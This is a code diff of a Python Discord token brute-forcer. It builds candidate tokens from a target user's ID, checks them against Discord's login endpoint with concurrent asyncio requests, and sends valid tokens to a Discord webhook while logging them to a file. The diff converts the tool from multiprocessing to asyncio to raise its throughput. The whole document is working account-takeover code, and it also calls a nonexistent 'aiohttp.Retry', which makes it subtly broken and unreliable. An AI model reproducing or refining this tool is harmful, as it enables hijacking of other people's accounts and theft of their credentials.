@@ -1,75 +1,68 @@
 import base64
-import os
 import random
 import string
-import requests
-import multiprocessing
-from requests.adapters import HTTPAdapter
-from requests.packages.urllib3.util.retry import Retry
+import asyncio
+import aiohttp
+from aiohttp import ClientSession
 from discord_webhook import DiscordWebhook
 
 # Replace <YOUR_WEBHOOK_URL> with the URL of your Discord webhook
 WEBHOOK_URL = "<YOUR_WEBHOOK_URL>"
 
 # Set up the HTTP session with retries and backoff
-retry_strategy = Retry(
+retry_options = aiohttp.Retry(
     total=3,
-    status_forcelist=[429, 500, 502, 503, 504],
+    status=[429, 500, 502, 503, 504],
     backoff_factor=1
 )
-http_adapter = HTTPAdapter(max_retries=retry_strategy)
-session = requests.Session()
-session.mount("https://", http_adapter)
+session = None
 
 # Encode the user ID to create the initial token
 id_to_token = base64.b64encode(input("ID TO TOKEN --> ").encode("ascii")).decode("ascii")
 
 # Send a "running" message to the webhook to indicate that the code has started
 webhook = DiscordWebhook(url=WEBHOOK_URL, content="@everyone Code is running")
-response = webhook.execute()
+webhook.execute()
 
-# Global list to store valid tokens
-valid_tokens = []
+async def generate_and_test_tokens(token_suffixes):
+    valid_tokens = []
+    invalid_count = 0
+    async with ClientSession() as session:
+        for suffix in token_suffixes:
+            token = f"{id_to_token}.{suffix}"
+            headers = {'Authorization': token}
+            async with session.get('https://discordapp.com/api/v9/auth/login', headers=headers) as response:
+                if response.status == 200:
+                    print('[+] VALID' + ' ' + token)
+                    valid_tokens.append(token)
+                    webhook = DiscordWebhook(url=WEBHOOK_URL, content=f"@everyone Valid token found: {token}")
+                    webhook.execute()
+                    with open('hit.txt', 'a+') as f:
+                        f.write(f'{token}\n')
+                else:
+                    invalid_count += 1
+    return valid_tokens, invalid_count
 
-# Function to generate and test tokens
-def generate_and_test_tokens(tokens):
-    for token in tokens:
-        headers = {'Authorization': token}
-        login = session.get('https://discordapp.com/api/v9/auth/login', headers=headers)
-        try:
-            if login.status_code == 200:
-                print('[+] VALID' + ' ' + token)
-                valid_tokens.append(token)  # Append valid token to the list
-            else:
-                print('[-] INVALID' + ' ' + token)
-        finally:
-            print("")
+# Number of tokens to generate and test
+num_tokens = 10000
 
-# Number of processes to use
-num_processes = 4
+# Generate token suffixes
+token_suffixes = [''.join(random.choices(string.ascii_letters + string.digits, k=29)) for _ in range(num_tokens)]
 
-# Number of tokens to generate and test per process
-tokens_per_process = 1000
+# Number of concurrent requests
+concurrent_requests = 100
 
-# Generate tokens for each process
-tokens = []
-for _ in range(num_processes):
-    token_suffixes = [''.join(random.choices(string.ascii_letters + string.digits, k=29)) for _ in range(tokens_per_process)]
-    tokens.extend([f"{id_to_token}.{suffix}" for suffix in token_suffixes])
+# Split token suffixes into chunks for concurrent processing
+token_chunks = [token_suffixes[i:i+concurrent_requests] for i in range(0, num_tokens, concurrent_requests)]
 
-# Split tokens into chunks for each process
-token_chunks = [tokens[i:i+tokens_per_process] for i in range(0, len(tokens), tokens_per_process)]
+# Run concurrent requests using asyncio
+loop = asyncio.get_event_loop()
+tasks = [generate_and_test_tokens(chunk) for chunk in token_chunks]
+results = loop.run_until_complete(asyncio.gather(*tasks))
+loop.close()
 
-# Create and start the processes
-pool = multiprocessing.Pool(processes=num_processes)
-pool.map(generate_and_test_tokens, token_chunks)
-pool.close()
-pool.join()
+# Flatten the valid tokens list and calculate the total number of invalid tokens
+valid_tokens = [token for sublist, _ in results for token in sublist]
+total_invalid = sum(invalid_count for _, invalid_count in results)
 
-# Send the valid tokens to the webhook
-for token in valid_tokens:
-    webhook = DiscordWebhook(url=WEBHOOK_URL, content=f"@everyone Valid token found: {token}")
-    webhook.execute()
-    # Write the valid token to a file
-    with open('hit.txt', 'a+') as f:
-        f.write(f'{token}\n')
+print(f"Total Invalid Tokens: {total_invalid}")
